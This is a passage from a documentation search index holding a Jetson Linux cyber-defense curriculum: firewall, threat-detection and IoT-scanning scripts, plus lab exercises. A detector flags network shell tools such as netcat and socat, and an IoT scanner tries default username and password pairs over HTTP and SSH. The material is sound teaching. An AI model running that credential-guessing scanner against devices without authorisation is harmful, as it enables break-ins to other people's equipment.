sshd\n</code></pre> <ol> <li>Monitor System Logs:</li> </ol> <pre><code>journalctl -xe\n</code></pre> <ol> <li>Run <code>chkrootkit</code>:</li> </ol> <pre><code>sudo chkrootkit\n</code></pre> <ol> <li>Enable Auditing:</li> </ol> <pre><code>sudo auditctl -w /etc/shadow -p wa -k shadow_watch\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#best-practices-recap","title":"\ud83d\udea8 Best Practices Recap","text":"<ul> <li>Keep system updated regularly</li> <li>Disable unused services and ports</li> <li>Use firewalls (<code>ufw</code>/<code>iptables</code>)</li> <li>Log and monitor all activity</li> <li>Use strong, unique passwords</li> <li>Never run user applications as root</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#challenge-for-students","title":"\ud83e\udde0 Challenge for Students","text":"<p>\ud83d\udca1 Try hardening your Jetson and writing a bash script that installs and configures <code>ufw</code>, <code>fail2ban</code>, <code>auditd</code>, and runs a periodic system check.</p> <p>\ud83c\udfc1 Bonus: Set up email alerts for intrusion logs.</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#containerized-security-environment-setup","title":"\ud83d\udc33 Containerized Security Environment Setup","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#prerequisites","title":"Prerequisites","text":"<pre><code># Ensure Docker is installed and running\nsudo systemctl start docker\nsudo usermod -aG docker $USER\n# Log out and back in for group changes to take effect\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#security-container-base-image","title":"Security Container Base Image","text":"<p>Create a comprehensive security toolkit container:</p> <pre><code># Dockerfile.security-toolkit\nFROM ubuntu:22.04\n\n# Install security tools\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    ufw \\\n    iptables \\\n    fail2ban \\\n    chkrootkit \\\n    clamav \\\n    auditd \\\n    rkhunter \\\n    lynis \\\n    nmap \\\n    tcpdump \\\n    wireshark-common \\\n    tshark \\\n    netstat-nat \\\n    ss \\\n    htop \\\n    iotop \\\n    strace \\\n    ltrace \\\n    gdb \\\n    python3 \\\n    python3-pip \\\n    curl \\\n    wget \\\n    git \\\n    vim \\\n    nano \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# Install Python security libraries\nRUN pip3 install \\\n    scapy \\\n    psutil \\\n    requests \\\n    beautifulsoup4 \\\n    paramiko \\\n    cryptography \\\n    pycryptodome \\\n    yara-python \\\n    volatility3 \\\n    bandit \\\n    safety\n\n# Create non-root user for security operations\nRUN useradd -m -s /bin/bash secops &amp;&amp; \\\n    usermod -aG sudo secops\n\n# Set up working directory\nWORKDIR /home/secops\nUSER secops\n\nCMD [\"/bin/bash\"]\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#build-and-run-security-container","title":"Build and Run Security Container","text":"<pre><code># Build the security toolkit container\ndocker build -f Dockerfile.security-toolkit -t jetson-security:latest .\n\n# Run with network and capability privileges for security tools\ndocker run -it --rm \\\n    --name jetson-security \\\n    --network host \\\n    --cap-add NET_ADMIN \\\n    --cap-add NET_RAW \\\n    --cap-add SYS_PTRACE \\\n    -v /var/log:/host/var/log:ro \\\n    -v /proc:/host/proc:ro \\\n    -v /sys:/host/sys:ro \\\n    -v $(pwd)/security-data:/home/secops/data \\\n    jetson-security:latest\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#advanced-jetson-security-hardening","title":"\ud83d\udd10 Advanced Jetson Security Hardening","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#1-container-based-firewall-management","title":"1. Container-Based Firewall Management","text":"<pre><code>#!/usr/bin/env python3\n# jetson_firewall_manager.py\nimport subprocess\nimport json\nimport logging\nfrom datetime import datetime\nimport psutil\n\nclass JetsonFirewallManager:\n    def __init__(self):\n        self.logger = self._setup_logging()\n        self.rules_file = \"/home/secops/data/firewall_rules.json\"\n\n    def _setup_logging(self):\n        logging.basicConfig(\n            level=logging.INFO,\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            handlers=[\n                logging.FileHandler('/home/secops/data/firewall.log'),\n                logging.StreamHandler()\n            ]\n        )\n        return logging.getLogger(__name__)\n\n    def get_network_interfaces(self):\n        \"\"\"Get all network interfaces on Jetson\"\"\"\n        interfaces = []\n        for interface, addrs in psutil.net_if_addrs().items():\n            if interface != 'lo':  # Skip loopback\n                interfaces.append({\n                    'name': interface,\n                    'addresses': [addr.address for addr in addrs]\n                })\n        return interfaces\n\n    def create_iot_firewall_rules(self):\n        \"\"\"Create IoT-specific firewall rules for Jetson\"\"\"\n        rules = {\n            'timestamp': datetime.now().isoformat(),\n            'rules': [\n                # Allow SSH (secure management)\n                {'action': 'allow', 'port': 22, 'protocol': 'tcp', 'description': 'SSH access'},\n\n                # IoT Communication Ports\n                {'action': 'allow', 'port': 1883, 'protocol': 'tcp', 'description': 'MQTT'},\n                {'action': 'allow', 'port': 8883, 'protocol': 'tcp', 'description': 'MQTT over SSL'},\n                {'action': 'allow', 'port': 5683, 'protocol': 'udp', 'description': 'CoAP'},\n                {'action': 'allow', 'port': 5684, 'protocol': 'udp', 'description': 'CoAP over DTLS'},\n\n                # Web services\n                {'action': 'allow', 'port': 80, 'protocol': 'tcp', 'description': 'HTTP'},\n                {'action': 'allow', 'port': 443, 'protocol': 'tcp', 'description': 'HTTPS'},\n\n                # Block common attack ports\n                {'action': 'deny', 'port': 23, 'protocol': 'tcp', 'description': 'Telnet'},\n                {'action': 'deny', 'port': 135, 'protocol': 'tcp', 'description': 'RPC'},\n                {'action': 'deny', 'port': 445, 'protocol': 'tcp', 'description': 'SMB'},\n                {'action': 'deny', 'port': 3389, 'protocol': 'tcp', 'description': 'RDP'},\n            ]\n        }\n\n        with open(self.rules_file, 'w') as f:\n            json.dump(rules, f, indent=2)\n\n        self.logger.info(f\"Created {len(rules['rules'])} firewall rules\")\n        return rules\n\n    def apply_iptables_rules(self, rules):\n        \"\"\"Apply iptables rules (requires container with NET_ADMIN capability)\"\"\"\n        try:\n            # Flush existing rules\n            subprocess.run(['iptables', '-F'], check=True)\n            subprocess.run(['iptables', '-X'], check=True)\n\n            # Set default policies\n            subprocess.run(['iptables', '-P', 'INPUT', 'DROP'], check=True)\n            subprocess.run(['iptables', '-P', 'FORWARD', 'DROP'], check=True)\n            subprocess.run(['iptables', '-P', 'OUTPUT', 'ACCEPT'], check=True)\n\n            # Allow loopback\n            subprocess.run(['iptables', '-A', 'INPUT', '-i', 'lo', '-j', 'ACCEPT'], check=True)\n\n            # Allow established connections\n            subprocess.run(['iptables', '-A', 'INPUT', '-m', 'state', '--state', 'ESTABLISHED,RELATED', '-j', 'ACCEPT'], check=True)\n\n            # Apply custom rules\n            for rule in rules['rules']:\n                if rule['action'] == 'allow':\n                    cmd = ['iptables', '-A', 'INPUT', '-p', rule['protocol'], '--dport', str(rule['port']), '-j', 'ACCEPT']\n                    subprocess.run(cmd, check=True)\n                    self.logger.info(f\"Applied allow rule: {rule['description']}\")\n                elif rule['action'] == 'deny':\n                    cmd = ['iptables', '-A', 'INPUT', '-p', rule['protocol'], '--dport', str(rule['port']), '-j', 'DROP']\n                    subprocess.run(cmd, check=True)\n                    self.logger.info(f\"Applied deny rule: {rule['description']}\")\n\n            self.logger.info(\"All firewall rules applied successfully\")\n\n        except subprocess.CalledProcessError as e:\n            self.logger.error(f\"Failed to apply iptables rules: {e}\")\n\n    def monitor_connections(self):\n        \"\"\"Monitor active network connections\"\"\"\n        connections = psutil.net_connections(kind='inet')\n        active_connections = []\n\n        for conn in connections:\n            if conn.status == 'ESTABLISHED':\n                active_connections.append({\n                    'local_address': f\"{conn.laddr.ip}:{conn.laddr.port}\",\n                    'remote_address': f\"{conn.raddr.ip}:{conn.raddr.port}\" if conn.raddr else \"N/A\",\n                    'status': conn.status,\n                    'pid': conn.pid\n                })\n\n        return active_connections\n\nif __name__ == \"__main__\":\n    firewall = JetsonFirewallManager()\n\n    # Get network interfaces\n    interfaces = firewall.get_network_interfaces()\n    print(f\"Network interfaces: {interfaces}\")\n\n    # Create and apply firewall rules\n    rules = firewall.create_iot_firewall_rules()\n    firewall.apply_iptables_rules(rules)\n\n    # Monitor connections\n    connections = firewall.monitor_connections()\n    print(f\"Active connections: {len(connections)}\")\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#2-advanced-threat-detection-system","title":"2. Advanced Threat Detection System","text":"<pre><code>#!/usr/bin/env python3\n# jetson_threat_detector.py\nimport psutil\nimport time\nimport json\nimport hashlib\nimport os\nimport subprocess\nfrom datetime import datetime, timedelta\nfrom collections import defaultdict, deque\nimport threading\nimport queue\n\nclass JetsonThreatDetector:\n    def __init__(self):\n        self.baseline_file = \"/home/secops/data/system_baseline.json\"\n        self.alerts_file = \"/home/secops/data/security_alerts.json\"\n        self.monitoring = True\n        self.alert_queue = queue.Queue()\n        self.process_history = deque(maxlen=1000)\n        self.network_history = deque(maxlen=1000)\n        self.file_integrity_db = {}\n\n        # Threat detection thresholds\n        self.thresholds = {\n            'cpu_spike': 90.0,  # CPU usage percentage\n            'memory_spike': 85.0,  # Memory usage percentage\n            'network_connections': 100,  # Max concurrent connections\n            'process_spawn_rate': 10,  # Processes per minute\n            'failed_login_attempts': 5,  # Failed logins per hour\n        }\n\n    def create_system_baseline(self):\n        \"\"\"Create baseline of normal system behavior\"\"\"\n        baseline = {\n            'timestamp': datetime.now().isoformat(),\n            'processes': [],\n            'network_connections': [],\n            'system_files': {},\n            'performance_metrics': {}\n        }\n\n        # Baseline processes\n        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):\n            try:\n                baseline['processes'].append(proc.info)\n            except (psutil.NoSuchProcess, psutil.AccessDenied):\n                continue\n\n        # Baseline network connections\n        baseline['network_connections'] = [\n            {\n                'local_address': f\"{conn.laddr.ip}:{conn.laddr.port}\",\n                'remote_address': f\"{conn.raddr.ip}:{conn.raddr.port}\" if conn.raddr else None,\n                'status': conn.status\n            }\n            for conn in psutil.net_connections()\n        ]\n\n        # Baseline system files (critical files to monitor)\n        critical_files = [\n            '/etc/passwd', '/etc/shadow', '/etc/hosts',\n            '/etc/ssh/sshd_config', '/etc/sudoers'\n        ]\n\n        for file_path in critical_files:\n            if os.path.exists(file_path):\n                with open(file_path, 'rb') as f:\n                    file_hash = hashlib.sha256(f.read()).hexdigest()\n                    baseline['system_files'][file_path] = {\n                        'hash': file_hash,\n                        'size': os.path.getsize(file_path),\n                        'mtime': os.path.getmtime(file_path)\n                    }\n\n        # Performance baseline\n        baseline['performance_metrics'] = {\n            'cpu_percent': psutil.cpu_percent(interval=1),\n            'memory_percent': psutil.virtual_memory().percent,\n            'disk_usage': psutil.disk_usage('/').percent,\n            'network_io': psutil.net_io_counters()._asdict()\n        }\n\n        with open(self.baseline_file, 'w') as f:\n            json.dump(baseline, f, indent=2)\n\n        print(f\"System baseline created with {len(baseline['processes'])} processes\")\n        return baseline\n\n    def detect_anomalous_processes(self):\n        \"\"\"Detect suspicious process behavior\"\"\"\n        alerts = []\n        current_processes = list(psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'cpu_percent', 'memory_percent']))\n\n        # Check for high resource usage\n        for proc in current_processes:\n            try:\n                if proc.info['cpu_percent'] &gt; self.thresholds['cpu_spike']:\n                    alerts.append({\n                        'type': 'high_cpu_usage',\n                        'severity': 'medium',\n                        'process': proc.info,\n                        'timestamp': datetime.now().isoformat(),\n                        'description': f\"Process {proc.info['name']} using {proc.info['cpu_percent']:.1f}% CPU\"\n                    })\n\n                if proc.info['memory_percent'] &gt; self.thresholds['memory_spike']:\n                    alerts.append({\n                        'type': 'high_memory_usage',\n                        'severity': 'medium',\n                        'process': proc.info,\n                        'timestamp': datetime.now().isoformat(),\n                        'description': f\"Process {proc.info['name']} using {proc.info['memory_percent']:.1f}% memory\"\n                    })\n\n                # Check for suspicious process names\n                suspicious_names = ['nc', 'netcat', 'ncat', 'socat', 'telnet', 'wget', 'curl']\n                if any(name in proc.info['name'].lower() for name in suspicious_names):\n                    alerts.append({\n                        'type': 'suspicious_process',\n                        'severity': 'high',\n                        'process': proc.info,\n                        'timestamp': datetime.now().isoformat(),\n                        'description': f\"Potentially suspicious process: {proc.info['name']}\"\n                    })\n\n            except (psutil.NoSuchProcess, psutil.AccessDenied):\n                continue\n\n        return alerts\n\n    def detect_network_anomalies(self):\n        \"\"\"Detect suspicious network activity\"\"\"\n        alerts = []\n        connections = psutil.net_connections(kind='inet')\n\n        # Count connections by remote IP\n        remote_ips = defaultdict(int)\n        for conn in connections:\n            if conn.raddr:\n                remote_ips[conn.raddr.ip] += 1\n\n        # Check for too many connections from single IP\n        for ip, count in remote_ips.items():\n            if count &gt; 10:  # Threshold for suspicious connection count\n                alerts.append({\n                    'type': 'multiple_connections',\n                    'severity': 'medium',\n                    'remote_ip': ip,\n                    'connection_count': count,\n                    'timestamp': datetime.now().isoformat(),\n                    'description': f\"Multiple connections ({count}) from IP {ip}\"\n                })\n\n        # Check for connections to suspicious ports\n        suspicious_ports = [23, 135, 445, 1433, 3389, 5900, 6667]\n        for conn in connections:\n            if conn.laddr and conn.laddr.port in suspicious_ports:\n                alerts.append({\n                    'type': 'suspicious_port',\n                    'severity': 'high',\n                    'port': conn.laddr.port,\n                    'timestamp': datetime.now().isoformat(),\n                    'description': f\"Connection on suspicious port {conn.laddr.port}\"\n                })\n\n        return alerts\n\n    def check_file_integrity(self):\n        \"\"\"Check integrity of critical system files\"\"\"\n        alerts = []\n\n        if not os.path.exists(self.baseline_file):\n            return alerts\n\n        with open(self.baseline_file, 'r') as f:\n            baseline = json.load(f)\n\n        for file_path, baseline_info in baseline.get('system_files', {}).items():\n            if os.path.exists(file_path):\n                with open(file_path, 'rb') as f:\n                    current_hash = hashlib.sha256(f.read()).hexdigest()\n\n                if current_hash != baseline_info['hash']:\n                    alerts.append({\n                        'type': 'file_integrity_violation',\n                        'severity': 'high',\n                        'file_path': file_path,\n                        'timestamp': datetime.now().isoformat(),\n                        'description': f\"Critical file {file_path} has been modified\"\n                    })\n            else:\n                alerts.append({\n                    'type': 'file_missing',\n                    'severity': 'high',\n                    'file_path': file_path,\n                    'timestamp': datetime.now().isoformat(),\n                    'description': f\"Critical file {file_path} is missing\"\n                })\n\n        return alerts\n\n    def analyze_system_logs(self):\n        \"\"\"Analyze system logs for security events\"\"\"\n        alerts = []\n\n        try:\n            # Check for failed SSH login attempts\n            result = subprocess.run(\n                ['grep', '-i', 'failed password', '/host/var/log/auth.log'],\n                capture_output=True, text=True, timeout=10\n            )\n\n            if result.returncode == 0:\n                failed_logins = result.stdout.strip().split('\\n')\n                recent_failures = []\n\n                for line in failed_logins:\n                    if line and 'ssh' in line.lower():\n                        recent_failures.append(line)\n\n                if len(recent_failures) &gt; self.thresholds['failed_login_attempts']:\n                    alerts.append({\n                        'type': 'brute_force_attempt',\n                        'severity': 'high',\n                        'failed_attempts': len(recent_failures),\n                        'timestamp': datetime.now().isoformat(),\n                        'description': f\"Multiple failed SSH login attempts detected: {len(recent_failures)}\"\n                    })\n\n        except (subprocess.TimeoutExpired, FileNotFoundError):\n            pass\n\n        return alerts\n\n    def generate_security_report(self):\n        \"\"\"Generate comprehensive security report\"\"\"\n        report = {\n            'timestamp': datetime.now().isoformat(),\n            'system_status': 'scanning',\n            'alerts': [],\n            'summary': {}\n        }\n\n        # Collect all alerts\n        all_alerts = []\n        all_alerts.extend(self.detect_anomalous_processes())\n        all_alerts.extend(self.detect_network_anomalies())\n        all_alerts.extend(self.check_file_integrity())\n        all_alerts.extend(self.analyze_system_logs())\n\n        report['alerts'] = all_alerts\n\n        # Generate summary\n        severity_counts = defaultdict(int)\n        alert_types = defaultdict(int)\n\n        for alert in all_alerts:\n            severity_counts[alert['severity']] += 1\n            alert_types[alert['type']] += 1\n\n        report['summary'] = {\n            'total_alerts': len(all_alerts),\n            'severity_breakdown': dict(severity_counts),\n            'alert_types': dict(alert_types),\n            'system_health': 'critical' if severity_counts['high'] &gt; 0 else 'warning' if severity_counts['medium'] &gt; 0 else 'good'\n        }\n\n        # Save report\n        with open(self.alerts_file, 'w') as f:\n            json.dump(report, f, indent=2)\n\n        return report\n\n    def continuous_monitoring(self, interval=60):\n        \"\"\"Run continuous threat monitoring\"\"\"\n        print(f\"Starting continuous monitoring (interval: {interval}s)\")\n\n        while self.monitoring:\n            try:\n                report = self.generate_security_report()\n\n                if report['summary']['total_alerts'] &gt; 0:\n                    print(f\"\\n\ud83d\udea8 SECURITY ALERT: {report['summary']['total_alerts']} alerts detected\")\n                    print(f\"System Health: {report['summary']['system_health'].upper()}\")\n\n                    for alert in report['alerts']:\n                        if alert['severity'] == 'high':\n                            print(f\"  \ud83d\udd34 HIGH: {alert['description']}\")\n                        elif alert['severity'] == 'medium':\n                            print(f\"  \ud83d\udfe1 MEDIUM: {alert['description']}\")\n                else:\n                    print(f\"\u2705 System monitoring: {report['summary']['system_health']}\")\n\n                time.sleep(interval)\n\n            except KeyboardInterrupt:\n                print(\"\\nStopping monitoring...\")\n                self.monitoring = False\n            except Exception as e:\n                print(f\"Monitoring error: {e}\")\n                time.sleep(interval)\n\nif __name__ == \"__main__\":\n    detector = JetsonThreatDetector()\n\n    # Create baseline if it doesn't exist\n    if not os.path.exists(detector.baseline_file):\n        print(\"Creating system baseline...\")\n        detector.create_system_baseline()\n\n    # Generate initial report\n    print(\"Generating security report...\")\n    report = detector.generate_security_report()\n    print(f\"Security Report: {report['summary']['total_alerts']} alerts, System Health: {report['summary']['system_health']}\")\n\n    # Start continuous monitoring\n    detector.continuous_monitoring(interval=30)\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#3-iot-device-security-scanner","title":"3. IoT Device Security Scanner","text":"<pre><code>#!/usr/bin/env python3\n# iot_security_scanner.py\nimport nmap\nimport socket\nimport requests\nimport json\nimport threading\nfrom datetime import datetime\nimport subprocess\nimport re\n\nclass IoTSecurityScanner:\n    def __init__(self):\n        self.nm = nmap.PortScanner()\n        self.scan_results = {}\n        self.vulnerabilities = []\n\n    def discover_iot_devices(self, network_range=\"192.168.1.0/24\"):\n        \"\"\"Discover IoT devices on the network\"\"\"\n        print(f\"Scanning network {network_range} for IoT devices...\")\n\n        # Perform network scan\n        self.nm.scan(hosts=network_range, arguments='-sn')\n\n        devices = []\n        for host in self.nm.all_hosts():\n            if self.nm[host].state() == 'up':\n                device_info = {\n                    'ip': host,\n                    'hostname': self.nm[host].hostname(),\n                    'mac': None,\n                    'vendor': None,\n                    'device_type': 'unknown',\n                    'open_ports': [],\n                    'services': [],\n                    'vulnerabilities': []\n                }\n\n                # Get MAC address and vendor\n                if 'mac' in self.nm[host]['addresses']:\n                    device_info['mac'] = self.nm[host]['addresses']['mac']\n                    # Try to identify vendor from MAC\n                    device_info['vendor'] = self._identify_vendor(device_info['mac'])\n\n                devices.append(device_info)\n\n        print(f\"Discovered {len(devices)} active devices\")\n        return devices\n\n    def _identify_vendor(self, mac_address):\n        \"\"\"Identify device vendor from MAC address\"\"\"\n        # Common IoT device MAC prefixes\n        iot_vendors = {\n            '00:17:88': 'Philips Hue',\n            '18:B4:30': 'Nest Labs',\n            '44:61:32': 'Ubiquiti Networks',\n            '00:04:20': 'Slim Devices (Logitech)',\n            '00:22:61': 'Honeywell',\n            'B8:27:EB': 'Raspberry Pi Foundation',\n            'DC:A6:32': 'Raspberry Pi Foundation',\n            '48:B0:2D': 'Amazon Technologies',\n            '74:C2:46': 'Amazon Technologies',\n            '00:FC:8B': 'Amazon Technologies'\n        }\n\n        mac_prefix = mac_address[:8].upper()\n        return iot_vendors.get(mac_prefix, 'Unknown')\n\n    def scan_device_ports(self, device_ip, port_range=\"1-1000\"):\n        \"\"\"Scan for open ports on a device\"\"\"\n        print(f\"Scanning ports on {device_ip}...\")\n\n        try:\n            self.nm.scan(device_ip, port_range, arguments='-sV -sC')\n\n            if device_ip in self.nm.all_hosts():\n                host_info = self.nm[device_ip]\n                open_ports = []\n                services = []\n\n                for protocol in host_info.all_protocols():\n                    ports = host_info[protocol].keys()\n                    for port in ports:\n                        port_info = host_info[protocol][port]\n                        if port_info['state'] == 'open':\n                            open_ports.append(port)\n                            service_info = {\n                                'port': port,\n                                'protocol': protocol,\n                                'service': port_info.get('name', 'unknown'),\n                                'version': port_info.get('version', 'unknown'),\n                                'product': port_info.get('product', 'unknown')\n                            }\n                            services.append(service_info)\n\n                return open_ports, services\n\n        except Exception as e:\n            print(f\"Error scanning {device_ip}: {e}\")\n\n        return [], []\n\n    def check_default_credentials(self, device_ip, services):\n        \"\"\"Check for default credentials on common IoT services\"\"\"\n        vulnerabilities = []\n\n        # Common default credentials for IoT devices\n        default_creds = [\n            ('admin', 'admin'),\n            ('admin', 'password'),\n            ('admin', ''),\n            ('root', 'root'),\n            ('user', 'user'),\n            ('guest', 'guest'),\n            ('admin', '12345'),\n            ('admin', 'admin123')\n        ]\n\n        for service in services:\n            port = service['port']\n            service_name = service['service']\n\n            # Check HTTP/HTTPS services\n            if service_name in ['http', 'https']:\n                protocol = 'https' if service_name == 'https' else 'http'\n\n                for username, password in default_creds:\n                    try:\n                        url = f\"{protocol}://{device_ip}:{port}/login\"\n                        response = requests.post(\n                            url,\n                            data={'username': username, 'password': password},\n                            timeout=5,\n                            verify=False\n                        )\n\n                        if response.status_code == 200 and 'dashboard' in response.text.lower():\n                            vulnerabilities.append({\n                                'type': 'default_credentials',\n                                'severity': 'high',\n                                'service': service_name,\n                                'port': port,\n                                'credentials': f\"{username}:{password}\",\n                                'description': f\"Default credentials found on {service_name} service\"\n                            })\n                            break\n\n                    except requests.RequestException:\n                        continue\n\n            # Check SSH service\n            elif service_name == 'ssh':\n                for username, password in default_creds:\n                    try:\n                        import paramiko\n                        ssh = paramiko.SSHClient()\n                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n                        ssh.connect(device_ip, port=port, username=username, password=password, timeout=5)\n\n                        vulnerabilities.append({\n                            'type': 'default_ssh_credentials',\n                            'severity': 'critical',\n                            'service': 'ssh',\n                            'port': port,\n                            'credentials': f\"{username}:{password}\",\n                            'description': f\"Default SSH credentials found\"\n                        })\n                        ssh.close()\n                        break\n\n                    except:\n                        continue\n\n        return vulnerabilities\n\n    def check_common_vulnerabilities(self, device_ip, services):\n        \"\"\"Check for common IoT vulnerabilities\"\"\"\n        vulnerabilities = []\n\n        for service in services:\n            port = service['port']\n            service_name = service['service']\n            version = service.get('version', '')\n\n            # Check for unencrypted services\n            if service_name in ['telnet', 'ftp', 'http']:\n                vulnerabilities.append({\n                    'type': 'unencrypted_service',\n                    'severity': 'medium',\n                    'service': service_name,\n                    'port': port,\n                    'description': f\"Unencrypted {service_name} service detected\"\n                })\n\n            # Check for outdated software versions\n            if version and any(old_version in version.lower() for old_version in ['1.0', '2.0', '2.1']):\n                vulnerabilities.append({\n                    'type': 'outdated_software',\n                    'severity': 'medium',\n                    'service': service_name,\n                    'port': port,\n                    'version': version,\n                    'description': f\"Potentially outdated software version: {version}\"\n                })\n\n            # Check for unnecessary services\n            unnecessary_services = ['finger', 'chargen', 'discard', 'echo']\n            if service_name in unnecessary_services:\n                vulnerabilities.append({\n                    'type': 'unnecessary_service',\n                    'severity': 'low',\n                    'service': service_name,\n                    'port': port,\n                    'description': f\"Unnecessary service {service_name} is running\"\n                })\n\n        return vulnerabilities\n\n    def generate_security_report(self, devices):\n        \"\"\"Generate comprehensive IoT security report\"\"\"\n        report = {\n            'timestamp': datetime.now().isoformat(),\n            'total_devices': len(devices),\n            'devices': devices,\n            'summary': {\n                'critical_vulnerabilities': 0,\n                'high_vulnerabilities': 0,\n                'medium_vulnerabilities': 0,\n                'low_vulnerabilities': 0,\n                'secure_devices': 0,\n                'vulnerable_devices': 0\n            },\n            'recommendations': []\n        }\n\n        for device in devices:\n            vuln_count = len(device['vulnerabilities'])\n            if vuln_count == 0:\n                report['summary']['secure_devices'] += 1\n            else:\n                report['summary']['vulnerable_devices'] += 1\n\n                for vuln in device['vulnerabilities']:\n                    severity = vuln['severity']\n                    report['summary'][f'{severity}_vulnerabilities'] += 1\n\n        # Generate recommendations\n        if report['summary']['critical_vulnerabilities'] &gt; 0:\n            report['recommendations'].append(\"\ud83d\udd34 CRITICAL: Immediately change default credentials and disable unnecessary services\")\n\n        if report['summary']['high_vulnerabilities'] &gt; 0:\n            report['recommendations'].append(\"\ud83d\udfe0 HIGH: Update firmware and enable encryption for all services\")\n\n        if report['summary']['medium_vulnerabilities'] &gt; 0:\n            report['recommendations'].append(\"\ud83d\udfe1 MEDIUM: Review service configurations and apply security patches\")\n\n        report['recommendations'].extend([\n            \"\u2705 Implement network segmentation for IoT devices\",\n            \"\u2705 Enable regular security monitoring and logging\",\n            \"\u2705 Use strong, unique passwords for all devices\",\n            \"\u2705 Keep firmware and software up to date\"\n        ])\n\n        return report\n\n    def scan_network(self, network_range=\"192.168.1.0/24\"):\n        \"\"\"Perform comprehensive IoT security scan\"\"\"\n        print(\"\ud83d\udd0d Starting IoT Security Scan...\")\n\n        # Discover devices\n        devices = self.discover_iot_devices(network_range)\n\n        # Scan each device\n        for device in devices:\n            print(f\"\\n\ud83d\udcf1 Scanning device: {device['ip']} ({device['vendor']})\")\n\n            # Port scan\n            open_ports, services = self.scan_device_ports(device['ip'])\n            device['open_ports'] = open_ports\n            device['services'] = services\n\n            # Vulnerability checks\n            vulnerabilities = []\n            vulnerabilities.extend(self.check_default_credentials(device['ip'], services))\n            vulnerabilities.extend(self.check_common_vulnerabilities(device['ip'], services))\n            device['vulnerabilities'] = vulnerabilities\n\n            # Classify device type based on services\n            device['device_type'] = self._classify_device_type(services)\n\n            print(f\"  Found {len(open_ports)} open ports, {len(vulnerabilities)} vulnerabilities\")\n\n        # Generate report\n        report = self.generate_security_report(devices)\n\n        # Save report\n        with open('/home/secops/data/iot_security_report.json', 'w') as f:\n            json.dump(report, f, indent=2)\n\n        return report\n\n    def _classify_device_type(self, services):\n        \"\"\"Classify device type based on running services\"\"\"\n        service_names = [s['service'] for s in services]\n\n        if 'http' in service_names or 'https' in service_names:\n            return 'web_device'\n        elif 'ssh' in service_names:\n            return 'linux_device'\n        elif 'telnet' in service_names:\n            return 'legacy_device'\n        elif any(port in [1883, 8883] for s in services for port in [s['port']]):\n            return 'iot_sensor'\n        else:\n            return 'unknown'\n\nif __name__ == \"__main__\":\n    scanner = IoTSecurityScanner()\n\n    # Scan local network\n    network = input(\"Enter network range to scan (default: 192.168.1.0/24): \") or \"192.168.1.0/24\"\n\n    report = scanner.scan_network(network)\n\n    print(f\"\\n\ud83d\udcca IoT Security Scan Complete!\")\n    print(f\"Total devices: {report['total_devices']}\")\n    print(f\"Vulnerable devices: {report['summary']['vulnerable_devices']}\")\n    print(f\"Critical vulnerabilities: {report['summary']['critical_vulnerabilities']}\")\n    print(f\"\\n\ud83d\udccb Recommendations:\")\n    for rec in report['recommendations']:\n        print(f\"  {rec}\")\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#advanced-cybersecurity-lab-exercises","title":"\ud83c\udfaf Advanced Cybersecurity Lab Exercises","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#lab-1-container-based-security-monitoring","title":"Lab 1: Container-Based Security Monitoring","text":"<p>Objective: Set up comprehensive security monitoring in a containerized environment.</p> <p>Tasks: 1. Build and deploy the security toolkit container 2. Configure firewall rules for IoT communication 3. Implement real-time threat detection 4. Create automated security reports</p> <p>Deliverables: - Running security container with monitoring dashboard - Firewall configuration optimized for Jetson IoT use cases - Threat detection system with custom rules - Automated security report generation</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#lab-2-iot-device-security-assessment","title":"Lab 2: IoT Device Security Assessment","text":"<p>Objective: Perform comprehensive security assessment of IoT devices on the network.</p> <p>Tasks: 1. Discover all IoT devices on the network 2. Identify device types and running services 3. Test for default credentials and common vulnerabilities 4. Generate security recommendations</p> <p>Deliverables: - Complete IoT device inventory - Vulnerability assessment report - Risk prioritization matrix - Remediation action plan</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#lab-3-incident-response-automation","title":"Lab 3: Incident Response Automation","text":"<p>Objective: Create automated incident response system for Jetson devices.</p> <pre><code>#!/usr/bin/env python3\n# incident_response_system.py\nimport json\nimport smtplib\nimport subprocess\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom datetime import datetime\nimport logging\n\nclass IncidentResponseSystem:\n    def __init__(self, config_file='/home/secops/data/incident_config.json'):\n        self.config = self._load_config(config_file)\n        self.logger = self._setup_logging()\n\n    def _load_config(self, config_file):\n        \"\"\"Load incident response configuration\"\"\"\n        default_config = {\n            'email': {\n                'smtp_server': 'smtp.gmail.com',\n                'smtp_port': 587,\n                'username': 'security@example.com',\n                'password': 'app_password',\n                'recipients': ['admin@example.com']\n            },\n            'response_actions': {\n                'high_severity': ['isolate_device', 'notify_admin', 'backup_logs'],\n                'medium_severity': ['log_incident', 'notify_admin'],\n                'low_severity': ['log_incident']\n            },\n            'auto_remediation': True\n        }\n\n        try:\n            with open(config_file, 'r') as f:\n                config = json.load(f)\n                # Merge with defaults\n                for key, value in default_config.items():\n                    if key not in config:\n                        config[key] = value\n                return config\n        except FileNotFoundError:\n            with open(config_file, 'w') as f:\n                json.dump(default_config, f, indent=2)\n            return default_config\n\n    def _setup_logging(self):\n        \"\"\"Setup incident response logging\"\"\"\n        logging.basicConfig(\n            level=logging.INFO,\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            handlers=[\n                logging.FileHandler('/home/secops/data/incident_response.log'),\n                logging.StreamHandler()\n            ]\n        )\n        return logging.getLogger(__name__)\n\n    def process_security_alert(self, alert):\n        \"\"\"Process a security alert and trigger 